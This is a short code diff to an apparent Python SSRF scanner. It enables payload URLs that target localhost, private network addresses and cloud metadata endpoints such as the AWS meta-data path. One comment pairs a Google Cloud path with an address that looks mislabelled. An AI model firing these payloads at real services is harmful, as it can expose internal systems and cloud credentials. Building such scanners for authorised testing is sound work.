@@ -3,16 +3,16 @@ import requests
 def ssrf_test(method, url, headers, body=None, parameter_fuzz_ssrf=None):
     body = {} if body is None else body
     ssrf_payloads = [
-        # "http://localhost",
-        # "http://127.0.0.1",
+        "http://localhost",
+        "http://127.0.0.1",
         "https://www.google.com",
         "http://ipinfo.io/ip",
-        # "http://169.254.169.254",  # AWS metadata endpoint
-        # "http://169.254.169.253",  # Google Cloud metadata endpoint
-        # "http://169.254.169.254/latest/meta-data/",  # AWS metadata endpoint
-        # "http://169.254.169.253/computeMetadata/v1/",  # Google Cloud metadata endpoint
-        # "http://192.168.0.1",
-        # "http://10.0.0.1",
+        "http://169.254.169.254",  # AWS metadata endpoint
+        "http://169.254.169.253",  # Google Cloud metadata endpoint
+        "http://169.254.169.254/latest/meta-data/",  # AWS metadata endpoint
+        "http://169.254.169.253/computeMetadata/v1/",  # Google Cloud metadata endpoint
+        "http://192.168.0.1",
+        "http://10.0.0.1",
     ]
 
     vulnerable = False
